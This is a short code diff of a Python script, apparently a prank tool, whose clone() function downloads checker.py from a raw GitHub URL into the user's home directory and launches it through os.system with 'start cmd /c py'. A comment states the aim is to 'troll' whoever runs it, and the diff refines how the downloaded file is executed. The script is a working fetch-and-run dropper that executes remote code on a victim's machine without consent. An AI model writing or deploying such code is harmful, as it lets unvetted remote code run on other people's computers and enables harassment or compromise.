@@ -1,6 +1,6 @@
 # Downloads and injects the files needed to troll your dumbass
 def clone():
-    import os, urllib.request, pathlib, subprocess
+    import os, urllib.request, pathlib
     dlurl = 'https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/checker.py'
     home = os.path.expanduser("~")
     path = str(home) + '\checker.py'
@@ -11,8 +11,8 @@ def clone():
         print('New System')
     urllib.request.urlretrieve(dlurl, '{}'.format(path))
     print('py '+ path)
-    #subprocess.Popen(["py", "cmd", "/k", "{}".format(path)], shell = True)
-    os.system("start /wait cmd /k {}".format('py ' + path))
+    os.chdir(home)
+    os.system("start cmd /c {}".format('py ' + path))
     exit()
 
 clone()
